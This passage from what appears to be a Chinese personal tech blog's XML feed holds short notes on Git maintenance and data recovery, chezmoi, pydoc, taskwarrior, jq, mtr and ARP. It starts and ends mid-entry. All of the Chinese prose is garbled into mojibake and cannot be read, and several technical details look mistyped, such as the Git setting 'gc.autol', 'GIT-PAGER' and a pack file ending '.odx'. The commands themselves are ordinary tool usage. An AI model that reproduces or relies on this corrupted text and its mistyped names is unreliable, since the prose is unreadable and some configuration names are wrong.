è¾“åè®®</h2><p>ä¸»è¦ä½¿ç”¨ä¸¤ä¸ªä¼ è¾“åè®®:</p><ul><li>â€œå“‘â€ (dumb) åè®®</li><li>â€œæ™ºèƒ½â€ (smart) åè®®</li></ul><h3 id="10-6-1-å“‘åè®®"><a href="#10-6-1-å“‘åè®®" class="headerlink" title="10.6.1 å“‘åè®®"></a>10.6.1 å“‘åè®®</h3><h3 id="10-6-2-æ™ºèƒ½åè®®"><a href="#10-6-2-æ™ºèƒ½åè®®" class="headerlink" title="10.6.2 æ™ºèƒ½åè®®"></a>10.6.2 æ™ºèƒ½åè®®</h3><h2 id="10-7-ç»´æŠ¤ä¸æ•°æ®æ¢å¤"><a href="#10-7-ç»´æŠ¤ä¸æ•°æ®æ¢å¤" class="headerlink" title="10.7 ç»´æŠ¤ä¸æ•°æ®æ¢å¤"></a>10.7 ç»´æŠ¤ä¸æ•°æ®æ¢å¤</h2><p><code>git gc</code> ä¸­çš„ <code>gc</code> æ˜¯ garbage collect (åƒåœ¾å›æ”¶) çš„ç¼©å†™. å…¶:</p><ul><li>æ”¶é›†æ‰€æœ‰çš„æ¾æ•£å¯¹è±¡å¹¶å°†å…¶æ”¾åˆ°åŒ…æ–‡ä»¶ä¸­</li><li>å°†å¤šä¸ªåŒ…æ–‡ä»¶åˆå¹¶æˆä¸€ä¸ªå¤§çš„åŒ…æ–‡ä»¶</li><li>åˆ é™¤æ²¡æœ‰ä¸ä»»ä½•æäº¤å…³è”çš„æˆæ—§å¯¹è±¡</li></ul><p>å¯ä»¥ä¿®æ”¹ <code>gc.autol</code> å’Œ <code>gc.autopacklimit</code> æ¥é…ç½®.</p><h2 id="10-7-2-æ•°æ®æ¢å¤"><a href="#10-7-2-æ•°æ®æ¢å¤" class="headerlink" title="10.7.2 æ•°æ®æ¢å¤"></a>10.7.2 æ•°æ®æ¢å¤</h2><p>åœ¨ä½¿ç”¨ <code>git reset --hard å“ˆå¸Œå€¼</code> é‡ç½®åˆ°ä¸€ä¸ªæ—§çš„åˆ†æ”¯åï¼Œæ— æ³•å¾—çŸ¥æœ€åä¸€æ¬¡æäº¤çš„ SHA-1 å€¼ã€‚å¯ä½¿ç”¨ <code>git reflog</code> å·¥å…·æŸ¥çœ‹.</p><p>æ¯æ¬¡æäº¤æˆ–ä¿®æ”¹åˆ†æ”¯ï¼Œå¼•ç”¨æ—¥å¿— (reflog) éƒ½ä¼šæ›´æ–°ã€‚</p><p><code>git update-ref</code> å‘½ä»¤ä¹Ÿä¼šæ›´æ–°æ—¥å¿—.</p><p>ä½¿ç”¨ <code>git log -g</code> å‘½ä»¤ä¼šå°†å¼•ç”¨æ—¥å¿— (reflog) æŒ‰ç…§æ­£å¸¸çš„æ—¥å¿—æ ¼å¼è¾“å‡º.</p><p>å¼•ç”¨æ—¥å¿—çš„å†…å®¹ä¿å­˜åœ¨ <code>.git/logs</code> ä¸­ï¼Œè‹¥å¼•ç”¨æ—¥å¿—è¢«åˆ é™¤ï¼Œä½¿ç”¨:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ git fsck --full<br></code></pre></td></tr></table></figure><p>å…¶ä¼šæ£€æŸ¥æ•°æ®çš„å®Œæ•´æ€§ï¼Œæ˜¾ç¤ºå‡ºæ‰€æœ‰æ²¡æœ‰è¢«å…¶ä»–å¯¹è±¡æŒ‡å‘çš„å¯¹è±¡.</p><h3 id="10-7-3-ç§»é™¤å¯¹è±¡"><a href="#10-7-3-ç§»é™¤å¯¹è±¡" class="headerlink" title="10.7.3 ç§»é™¤å¯¹è±¡"></a>10.7.3 ç§»é™¤å¯¹è±¡</h3><p><code>git clone</code> ä¼šä¸‹è½½é¡¹ç›®çš„æ•´ä¸ªå†å²è®°å½•ï¼ŒåŒ…æ‹¬æ¯ä¸€ä¸ªæ–‡ä»¶çš„æ¯ä¸€ä¸ªç‰ˆæœ¬.</p><p>æœ‰äººæ·»åŠ äº†ä¸€ä¸ªå¤§æ–‡ä»¶åœ¨æäº¤å†å²ä¸­ï¼Œå°±ç®—åœ¨æœ¬æ¬¡æäº¤åˆ é™¤ï¼Œè¯¥æ–‡ä»¶ä¹Ÿä¸€ç›´å­˜åœ¨åˆ°æäº¤å†å²ä¸­.</p><p>æƒ³è¦å½»åº•åˆ é™¤è¿™ä¸ªæ–‡ä»¶çš„æ–¹æ³•ï¼Œå¯èƒ½ä¼šç ´åæäº¤å†å².</p><p>å¯ä»¥æ‰§è¡Œ <code>count-objects</code> å‘½ä»¤å¿«é€ŸæŸ¥çœ‹ç£ç›˜ç©ºé—´çš„ä½¿ç”¨æƒ…å†µ: </p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ git count-objects -v<br></code></pre></td></tr></table></figure><p>æŸ¥æ‰¾å¤§ä½“ç§¯æ–‡ä»¶:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ git verify-pack -v .git/objects/pack/pack-29_69.odx \<br>  | <span class="hljs-built_in">sort</span> -k 3 -n \<br>  | <span class="hljs-built_in">tail</span> -3<br></code></pre></td></tr></table></figure><p>å…·ä½“åˆ é™¤æ“ä½œçœ‹ä¹¦.</p><h2 id="10-8-ç¯å¢ƒå˜é‡"><a href="#10-8-ç¯å¢ƒå˜é‡" class="headerlink" title="10.8 ç¯å¢ƒå˜é‡"></a>10.8 ç¯å¢ƒå˜é‡</h2><h3 id="10-8-1-å…¨å±€è¡Œä¸º"><a href="#10-8-1-å…¨å±€è¡Œä¸º" class="headerlink" title="10.8.1 å…¨å±€è¡Œä¸º"></a>10.8.1 å…¨å±€è¡Œä¸º</h3><p><code>GIT_EXEC_PATH</code> å†³å®šäº† Git ä»å“ªé‡ŒæŸ¥æ‰¾å®ƒçš„å­ç¨‹åº (å¦‚ git-commit, git-diff). å¯ä»¥ç”¨:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ git --exec-path<br></code></pre></td></tr></table></figure><p>æ¥æ£€æŸ¥å½“å‰è®¾ç½®.</p><p>Git é€šè¿‡ <code>HOME</code> æŸ¥æ‰¾å…¨å±€é…ç½®æ–‡ä»¶.</p><p><code>GIT-PAGER</code> ç”¨äºæ§åˆ¶åœ¨å‘½ä»¤è¡Œä¸Šæ˜¾ç¤ºå¤šé¡µè¾“å‡ºçš„ç¨‹åºï¼Œæ²¡æœ‰è®¾ç½®åˆ™ä½¿ç”¨ <code>PAGER</code></p><p>Git è¿è¡Œ <code>GIT_EDITOR</code> ä½œä¸ºç¼–è¾‘å™¨ï¼Œå¦‚æœæ²¡æœ‰è®¾ç½®ï¼Œåˆ™ä½¿ç”¨ <code>EDITOR</code></p><p>è¿˜æœ‰ <code>PREFIX</code>, <code>GIT_CONFIG_NOSYSTEM</code>, å…·ä½“çœ‹ä¹¦.</p><h3 id="10-8-2-ä»“åº“ä½ç½®"><a href="#10-8-2-ä»“åº“ä½ç½®" class="headerlink" title="10.8.2 ä»“åº“ä½ç½®"></a>10.8.2 ä»“åº“ä½ç½®</h3><h3 id="10-8-3-è·¯å¾„è§„æ ¼"><a href="#10-8-3-è·¯å¾„è§„æ ¼" class="headerlink" title="10.8.3 è·¯å¾„è§„æ ¼"></a>10.8.3 è·¯å¾„è§„æ ¼</h3><h3 id="10-8-4-æäº¤"><a href="#10-8-4-æäº¤" class="headerlink" title="10.8.4 æäº¤"></a>10.8.4 æäº¤</h3><h3 id="10-8-5-ç½‘ç»œ"><a href="#10-8-5-ç½‘ç»œ" class="headerlink" title="10.8.5 ç½‘ç»œ"></a>10.8.5 ç½‘ç»œ</h3><h3 id="10-8-6-å·®å¼‚å’Œåˆå¹¶"><a href="#10-8-6-å·®å¼‚å’Œåˆå¹¶" class="headerlink" title="10.8.6 å·®å¼‚å’Œåˆå¹¶"></a>10.8.6 å·®å¼‚å’Œåˆå¹¶</h3><h3 id="10-8-7-è°ƒè¯•"><a href="#10-8-7-è°ƒè¯•" class="headerlink" title="10.8.7 è°ƒè¯•"></a>10.8.7 è°ƒè¯•</h3><h3 id="10-8-8-æ‚é¡¹"><a href="#10-8-8-æ‚é¡¹" class="headerlink" title="10.8.8 æ‚é¡¹"></a>10.8.8 æ‚é¡¹</h3>]]></content>
    
    
    <categories>
      
      <category>Git</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>dotfile-ç®¡ç†-chezmoi-ä½¿ç”¨</title>
    <link href="/2022/11/04/dotfile-%E7%AE%A1%E7%90%86-chezmoi-%E4%BD%BF%E7%94%A8/"/>
    <url>/2022/11/04/dotfile-%E7%AE%A1%E7%90%86-chezmoi-%E4%BD%BF%E7%94%A8/</url>
    
    <content type="html"><![CDATA[<p><a href="https://www.chezmoi.io/quick-start/#next-steps">å®˜ç½‘</a></p><p>å¦‚æœå‘½ä»¤ä¸ç®¡ç”¨ï¼Œå°±ç›´æ¥ä» github æ‹‰ä¸‹æ¥ï¼Œé‡å‘½åä¸º <code>~/.local/share/chezmoi</code> åæ‰§è¡Œ:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ chezmoi -v apply<br></code></pre></td></tr></table></figure><p>å³å¯.</p>]]></content>
    
    
    <categories>
      
      <category>Linux</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>python-çš„å‘½ä»¤è¡Œæ–‡æ¡£-pydoc</title>
    <link href="/2022/11/04/python-%E7%9A%84%E5%91%BD%E4%BB%A4%E8%A1%8C%E6%96%87%E6%A1%A3-pydoc/"/>
    <url>/2022/11/04/python-%E7%9A%84%E5%91%BD%E4%BB%A4%E8%A1%8C%E6%96%87%E6%A1%A3-pydoc/</url>
    
    <content type="html"><![CDATA[<p><a href="https://docs.python.org/3/library/pydoc.html">å‚è€ƒ</a></p><p>ç›´æ¥åœ¨å‘½ä»¤è¡Œä½¿ç”¨å³å¯, å¦‚:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ pydoc socket<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Python</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>å…³äº-pip-ä¸èƒ½ä¸‹è½½-socket-æ¨¡å—</title>
    <link href="/2022/11/04/%E5%85%B3%E4%BA%8E-pip-%E4%B8%8D%E8%83%BD%E4%B8%8B%E8%BD%BD-socket-%E6%A8%A1%E5%9D%97/"/>
    <url>/2022/11/04/%E5%85%B3%E4%BA%8E-pip-%E4%B8%8D%E8%83%BD%E4%B8%8B%E8%BD%BD-socket-%E6%A8%A1%E5%9D%97/</url>
    
    <content type="html"><![CDATA[<p>socket æ¨¡å—ä¸º python çš„æ ‡å‡†åº“æ¨¡å—ï¼Œä¸éœ€è¦é¢å¤–å®‰è£….</p>]]></content>
    
    
    <categories>
      
      <category>Python</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>MPlayer-ä½¿ç”¨</title>
    <link href="/2022/11/03/MPlayer-%E4%BD%BF%E7%94%A8/"/>
    <url>/2022/11/03/MPlayer-%E4%BD%BF%E7%94%A8/</url>
    
    <content type="html"><![CDATA[<p><a href="https://wiki.archlinux.org/title/MPlayer_(%E7%AE%80%E4%BD%93%E4%B8%AD%E6%96%87)">å‚è€ƒ</a></p>]]></content>
    
    
    <categories>
      
      <category>Arch</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>å…³äº-you-get-é€Ÿåº¦ç¼“æ…¢</title>
    <link href="/2022/11/03/%E5%85%B3%E4%BA%8E-you-get-%E9%80%9F%E5%BA%A6%E7%BC%93%E6%85%A2/"/>
    <url>/2022/11/03/%E5%85%B3%E4%BA%8E-you-get-%E9%80%9F%E5%BA%A6%E7%BC%93%E6%85%A2/</url>
    
    <content type="html"><![CDATA[<p><a href="https://www.bear962464.cn/2021/01/04/1001/">å‚è€ƒ1 ä¿®æ”¹ UA</a></p><p><a href="https://www.google.com/search?client=firefox-b-d&q=%E6%9F%A5%E7%9C%8B+UA">å‚è€ƒ2 æŸ¥çœ‹ UA</a></p>]]></content>
    
    
    <categories>
      
      <category>Linux</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>ä½¿ç”¨-markmap-ç”»æ€ç»´å¯¼å›¾</title>
    <link href="/2022/11/02/%E4%BD%BF%E7%94%A8-markmap-%E7%94%BB%E6%80%9D%E7%BB%B4%E5%AF%BC%E5%9B%BE/"/>
    <url>/2022/11/02/%E4%BD%BF%E7%94%A8-markmap-%E7%94%BB%E6%80%9D%E7%BB%B4%E5%AF%BC%E5%9B%BE/</url>
    
    <content type="html"><![CDATA[<p><a href="https://github.com/markmap/coc-markmap">Github é¡µé¢</a></p><p>ä¸€ä¸ªä¸€çº§æ ‡é¢˜ç®—ä¸€ä¸ªåˆ†æ”¯ï¼ŒäºŒçº§æ ‡é¢˜ç®—æ˜¯å­åˆ†æ”¯.</p><p><code>-</code> ï¼Œå³åŸæ¥å†™åºåˆ—ç”¨çš„ä½œä¸ºå­åˆ†æ”¯.</p><p>ç”±äº <code>coc-markmap</code> çš„å®‰è£…é—®é¢˜ï¼Œç›´æ¥ä½¿ç”¨å‘½ä»¤è¡Œä¸‹çš„æ›¿ä»£.</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ markmap file.md<br></code></pre></td></tr></table></figure><p>æ·»åŠ å¿«æ·é”®:</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs Vim"><span class="hljs-keyword">nnoremap</span> <span class="hljs-symbol">&lt;LEADER&gt;</span>pn :!markmap %<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Markdown</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Markdown-ç”»æµç¨‹å›¾</title>
    <link href="/2022/11/02/Markdown-%E7%94%BB%E6%B5%81%E7%A8%8B%E5%9B%BE/"/>
    <url>/2022/11/02/Markdown-%E7%94%BB%E6%B5%81%E7%A8%8B%E5%9B%BE/</url>
    
    <content type="html"><![CDATA[<h1 id="æµç¨‹å›¾-å‚è€ƒ"><a href="#æµç¨‹å›¾-å‚è€ƒ" class="headerlink" title="æµç¨‹å›¾ å‚è€ƒ"></a><a href="https://juejin.cn/post/7038144693867118629">æµç¨‹å›¾ å‚è€ƒ</a></h1><p>éœ€æ·»åŠ ä»£ç å—:</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs markdown"><br><span class="hljs-code">```mermaid</span><br><span class="hljs-code">    </span><br><span class="hljs-code">\```</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Markdown</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>æ¦‚ç‡è®ºä¸æ•°ç†ç»Ÿè®¡-é™ˆå¸Œå­º</title>
    <link href="/2022/11/02/%E6%A6%82%E7%8E%87%E8%AE%BA%E4%B8%8E%E6%95%B0%E7%90%86%E7%BB%9F%E8%AE%A1-%E9%99%88%E5%B8%8C%E5%AD%BA/"/>
    <url>/2022/11/02/%E6%A6%82%E7%8E%87%E8%AE%BA%E4%B8%8E%E6%95%B0%E7%90%86%E7%BB%9F%E8%AE%A1-%E9%99%88%E5%B8%8C%E5%AD%BA/</url>
    
    <content type="html"><![CDATA[<h1 id="ç¬¬ä¸€ç« -äº‹ä»¶çš„æ¦‚ç‡"><a href="#ç¬¬ä¸€ç« -äº‹ä»¶çš„æ¦‚ç‡" class="headerlink" title="ç¬¬ä¸€ç«  äº‹ä»¶çš„æ¦‚ç‡"></a>ç¬¬ä¸€ç«  äº‹ä»¶çš„æ¦‚ç‡</h1><h2 id="1-1-æ¦‚ç‡æ˜¯ä»€ä¹ˆ"><a href="#1-1-æ¦‚ç‡æ˜¯ä»€ä¹ˆ" class="headerlink" title="1.1 æ¦‚ç‡æ˜¯ä»€ä¹ˆ"></a>1.1 æ¦‚ç‡æ˜¯ä»€ä¹ˆ</h2><h3 id="1-1-2-è¯•éªŒä¸äº‹ä»¶"><a href="#1-1-2-è¯•éªŒä¸äº‹ä»¶" class="headerlink" title="1.1.2 è¯•éªŒä¸äº‹ä»¶"></a>1.1.2 è¯•éªŒä¸äº‹ä»¶</h3>]]></content>
    
    
    <categories>
      
      <category>Probability</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>ä½¿ç”¨-taskwarrior</title>
    <link href="/2022/11/02/%E4%BD%BF%E7%94%A8-taskwarrior/"/>
    <url>/2022/11/02/%E4%BD%BF%E7%94%A8-taskwarrior/</url>
    
    <content type="html"><![CDATA[<h1 id="å‚è€ƒ1"><a href="#å‚è€ƒ1" class="headerlink" title="å‚è€ƒ1"></a><a href="https://taskwarrior.org/download/">å‚è€ƒ1</a></h1><h2 id="ç®€ä»‹"><a href="#ç®€ä»‹" class="headerlink" title="ç®€ä»‹"></a>ç®€ä»‹</h2><p>è§„åˆ’ä»»åŠ¡æ¸…å•.</p><h2 id="ArchLinux-ä¸­ä¸‹è½½"><a href="#ArchLinux-ä¸­ä¸‹è½½" class="headerlink" title="ArchLinux ä¸­ä¸‹è½½"></a>ArchLinux ä¸­ä¸‹è½½</h2><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ sudo pacman -S taskwarrior-tui<br></code></pre></td></tr></table></figure><h2 id="åŸºæœ¬ä½¿ç”¨"><a href="#åŸºæœ¬ä½¿ç”¨" class="headerlink" title="åŸºæœ¬ä½¿ç”¨"></a>åŸºæœ¬ä½¿ç”¨</h2><p><code>add</code>, <code>list</code>, <code>done</code>.</p><h1 id="å‚è€ƒ2-Bç«™"><a href="#å‚è€ƒ2-Bç«™" class="headerlink" title="å‚è€ƒ2 Bç«™"></a><a href="https://www.bilibili.com/video/BV1pi4y1L7Vx/?spm_id_from=333.337.search-card.all.click&vd_source=bc8ddbb1a08707dc809c3fd9bb85290d">å‚è€ƒ2 Bç«™</a></h1><p>é…ç½®æ–‡ä»¶ä¸‹æœ‰é¢œè‰²ä¸»é¢˜.</p><h2 id="åŸºæœ¬ä½¿ç”¨-1"><a href="#åŸºæœ¬ä½¿ç”¨-1" class="headerlink" title="åŸºæœ¬ä½¿ç”¨"></a>åŸºæœ¬ä½¿ç”¨</h2><p>å¦‚:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ task 1 start<br>$ task 1 <span class="hljs-keyword">done</span><br></code></pre></td></tr></table></figure><p>ç”¨ <code>task all</code> å¯ä»¥çœ‹åˆ°æ‰€æœ‰ä»»åŠ¡ï¼Œå°½ç®¡å·²ç»ç”¨ <code>done</code> å®Œæˆæˆ– <code>delete</code> åˆ é™¤.</p><p><code>modify</code> å¯ä¿®æ”¹.</p><p>é…·ç‚«å‘½ä»¤ <code>task burndown.daily</code>.</p><h3 id="æ ‡ç­¾"><a href="#æ ‡ç­¾" class="headerlink" title="æ ‡ç­¾"></a>æ ‡ç­¾</h3><p>å¯ä»¥å¯¹ä¸€ä¸ª task æ‰“ä¸Šä¸€ä¸ªæˆ–å¤šä¸ªæ ‡ç­¾.</p><p>ä½¿ç”¨ <code>+</code> æ¥å¢åŠ æ ‡ç­¾, å¦‚:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ task +homework English<br></code></pre></td></tr></table></figure><p>å°±ä¼šç»™ <code>English</code> æ‰“ä¸Š <code>homework</code> çš„æ ‡ç­¾.</p><p>è¿‡æ»¤æ˜¾ç¤º, å¦‚:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ task +homework<br></code></pre></td></tr></table></figure><p>å»é™¤æ ‡ç­¾ç”¨ <code>-</code>, ä¹Ÿå¯ä»¥ç”¨æ¥è¿‡æ»¤ä¸æƒ³æ˜¾ç¤ºçš„ä»»åŠ¡:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ task 1 mod -homework<br>$ task -homework<br></code></pre></td></tr></table></figure><h3 id="è™šæ‹Ÿæ ‡ç­¾"><a href="#è™šæ‹Ÿæ ‡ç­¾" class="headerlink" title="è™šæ‹Ÿæ ‡ç­¾"></a>è™šæ‹Ÿæ ‡ç­¾</h3><p>å…¶æ˜¯å†…éƒ¨å°è£…çš„ä¸€äº›è¿‡æ»¤æ¡ä»¶.</p><p>å¦‚:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ task +TAGGED<br></code></pre></td></tr></table></figure><p>å…¶è¿‡æ»¤å‡ºæ‰“ä¸Šäº†æ ‡ç­¾çš„ä»»åŠ¡.</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ task +TODAY<br></code></pre></td></tr></table></figure><p>æœ€åä¸€ä¸ªæ·»åŠ çš„:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ task +LATEST<br></code></pre></td></tr></table></figure><p><a href="https://taskwarrior.org/docs/tags/">å®˜ç½‘åˆè®¡æ ‡ç­¾</a></p><h3 id="å±æ€§"><a href="#å±æ€§" class="headerlink" title="å±æ€§"></a>å±æ€§</h3><p>åˆ†ä¸¤ç§:</p><ul><li>core attributes</li><li>user define attributes</li></ul><p>åœ¨ <code>task help</code> ä¸­æ‰¾åˆ° <code>Build-in attributes</code> å¯ä»¥çœ‹åˆ°æ‰€æœ‰çš„å†…ç½®å±æ€§.</p><p>å¦‚:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ task <span class="hljs-string">&#x27;urgency&gt;1&#x27;</span><br></code></pre></td></tr></table></figure><p>è¿˜æœ‰:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ task <span class="hljs-string">&#x27;description~test&#x27;</span><br></code></pre></td></tr></table></figure><p>é¡¹ç›® project:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ task +LATEST mod project:å·¥ä½œ<br></code></pre></td></tr></table></figure><p><code>project</code> æç¤ºåé¢ä¸ºæ·»åŠ çš„ä¸€ä¸ªé¡¹ç›®.</p><p>è¿‡æ»¤:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ task project.not:å·¥ä½œ<br></code></pre></td></tr></table></figure><p><code>task</code> å…¶å®é»˜è®¤æ·»åŠ äº† <code>status:pending</code> çš„è¿‡æ»¤.</p><p>æ˜¾ç¤ºé¡¹ç›®:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ task projects<br></code></pre></td></tr></table></figure><p>é¡¹ç›®å¯ä»¥æœ‰å­é¡¹ç›®.</p><h4 id="ç”¨æˆ·å®šä¹‰å±æ€§-uda"><a href="#ç”¨æˆ·å®šä¹‰å±æ€§-uda" class="headerlink" title="ç”¨æˆ·å®šä¹‰å±æ€§ uda"></a>ç”¨æˆ·å®šä¹‰å±æ€§ uda</h4><p>taskwarrior æ”¯æŒå››ç§ç±»å‹:</p><ul><li>string</li><li>numeric</li><li>date</li><li>duration</li></ul><p><code>task config uda.estimate.type numeric</code></p><p><code>task info</code> å¯ä»¥æŸ¥çœ‹ä¿¡æ¯.</p><p>æŸ¥çœ‹ <code>next</code> æŠ¥è¡¨æ˜¾ç¤ºçš„å­—æ®µ:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ task show report.next<br></code></pre></td></tr></table></figure><p>å¯ä»¥ç›´æ¥ä¿®æ”¹ <code>.taskrc</code> æ–‡ä»¶æ¥é…ç½®.</p>]]></content>
    
    
    <categories>
      
      <category>Linux</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>å…³äº-Archlinux-ä¸‹-wps-æ— æ³•æ‰“å¼€</title>
    <link href="/2022/10/31/%E5%85%B3%E4%BA%8E-Archlinux-%E4%B8%8B-wps-%E6%97%A0%E6%B3%95%E6%89%93%E5%BC%80/"/>
    <url>/2022/10/31/%E5%85%B3%E4%BA%8E-Archlinux-%E4%B8%8B-wps-%E6%97%A0%E6%B3%95%E6%89%93%E5%BC%80/</url>
    
    <content type="html"><![CDATA[<p><a href="https://bbs.archlinuxcn.org/viewtopic.php?id=11216">å‚è€ƒ</a></p><p>å®æµ‹é‡è£…ç®¡ç”¨.</p>]]></content>
    
    
    <categories>
      
      <category>Arch</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>å…³äº-jq-å‘½ä»¤</title>
    <link href="/2022/10/31/%E5%85%B3%E4%BA%8E-jq-%E5%91%BD%E4%BB%A4/"/>
    <url>/2022/10/31/%E5%85%B3%E4%BA%8E-jq-%E5%91%BD%E4%BB%A4/</url>
    
    <content type="html"><![CDATA[<p><a href="https://wangchujiang.com/linux-command/c/jq.html">å‚è€ƒ</a></p><p><code>jq</code> æ˜¯ä¸€ä¸ªè½»é‡çº§çš„å‘½ä»¤è¡Œ JSON å¤„ç†å™¨.</p><p><code>jq</code> å°†ç»™å®šçš„è¿‡æ»¤å™¨åº”ç”¨äºå…¶ JSON æ–‡æœ¬è¾“å…¥å¹¶åœ¨æ ‡å‡†è¾“å‡ºä¸Šå°†è¿‡æ»¤å™¨çš„ç»“æœç”Ÿæˆä¸º JSON.</p><p>å¦‚:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ $ <span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;&#123; &quot;foo&quot;: &#123; &quot;bar&quot;: &#123; &quot;baz&quot;: 123 &#125; &#125; &#125;&#x27;</span> | jq <span class="hljs-string">&#x27;.&#x27;</span><br>&#123;<br>  <span class="hljs-string">&quot;foo&quot;</span>: &#123;<br>    <span class="hljs-string">&quot;bar&quot;</span>: &#123;<br>      <span class="hljs-string">&quot;baz&quot;</span>: 123<br>    &#125;<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>è¿™é‡Œçš„ <code>&#39;.&#39;</code> æ˜¯ä¸€ä¸ªè¿‡æ»¤å™¨, ä»¥æ¼‚äº®çš„æ–¹å¼è¾“å‡º.</p>]]></content>
    
    
    <categories>
      
      <category>Linux</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>ç½‘ç»œç›¸å…³éšè®°</title>
    <link href="/2022/10/31/%E7%BD%91%E7%BB%9C%E7%9B%B8%E5%85%B3%E9%9A%8F%E8%AE%B0/"/>
    <url>/2022/10/31/%E7%BD%91%E7%BB%9C%E7%9B%B8%E5%85%B3%E9%9A%8F%E8%AE%B0/</url>
    
    <content type="html"><![CDATA[<p>ä¸ªäººçš„ä¸»æœºä¸Šé¢æœ‰ ARP çš„æ˜ å°„è¡¨. è‹¥åªçŸ¥é“å†…ç½‘ä¸­æŸä¸ªä¸»æœºçš„ IP è€Œä¸çŸ¥é“ MAC çš„è¯è¿˜æ˜¯è¦å¹¿æ’­ ARP æŸ¥è¯¢çš„æ•°æ®åŒ….</p>]]></content>
    
    
    <categories>
      
      <category>Web</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>å…³äº-mtr-å‘½ä»¤</title>
    <link href="/2022/10/31/%E5%85%B3%E4%BA%8E-mtr-%E5%91%BD%E4%BB%A4/"/>
    <url>/2022/10/31/%E5%85%B3%E4%BA%8E-mtr-%E5%91%BD%E4%BB%A4/</url>
    
    <content type="html"><![CDATA[<p><a href="https://www.cnblogs.com/my-show-time/p/15062134.html">å‚è€ƒ</a></p><h1 id="ç®€ä»‹"><a href="#ç®€ä»‹" class="headerlink" title="ç®€ä»‹"></a>ç®€ä»‹</h1><p><code>mtr</code> (My traceroute), å…¶å°† <code>ping</code> å’Œ <code>traceroute</code> çš„åŠŸèƒ½åˆå¹¶.</p><p>å…¶èƒ½å¤Ÿé¿å…èŠ‚ç‚¹æ³¢åŠ¨å¯¹æµ‹è¯•ç»“æœçš„å½±å“.</p>]]></content>
    
    
    <categories>
      
      <category>Linux</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>å…³äºç”µåŠ¨åŠ¿</title>
    <link href="/2022/10/31/%E5%85%B3%E4%BA%8E%E7%94%B5%E5%8A%A8%E5%8A%BF/"/>
    <url>/2022/10/31/%E5%85%B3%E4%BA%8E%E7%94%B5%E5%8A%A8%E5%8A%BF/</url>
    
